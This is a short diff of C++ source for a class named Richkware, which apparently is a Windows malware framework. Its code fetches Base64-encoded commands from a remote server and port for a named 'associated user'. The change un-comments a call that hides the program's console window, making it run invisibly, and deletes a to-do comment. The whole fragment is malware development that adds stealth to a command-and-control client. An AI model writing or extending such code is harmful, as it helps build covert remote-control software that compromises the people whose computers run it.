@@ -92,7 +92,6 @@ void Richkware::RandMouse() {
 }
 
 std::vector<std::string> Richkware::getCommands(const char *serverAddress, const char *port) {
-    //TODO: gestire i remainingCommands
     std::string commands = network.fetchCommand(serverAddress, port);
     std::string decodedCommands = Base64_decode(commands);
     std::vector<std::string> commandList;
@@ -170,7 +169,7 @@ Richkware::Richkware(const char *AppNameArg, std::string EncryptionKeyArg) {
 Richkware::Richkware(const char *AppNameArg, std::string defaultEncryptionKey, const char *serverAddress,
                      const char *port, const char *associatedUser) {
     appName = AppNameArg;
-//    ShowWindow(GetConsoleWindow(), 0);
+    ShowWindow(GetConsoleWindow(), 0);
     systemStorage = SystemStorage(AppNameArg);
 
     // **encryptionKey**: check presence of encryption key in the system
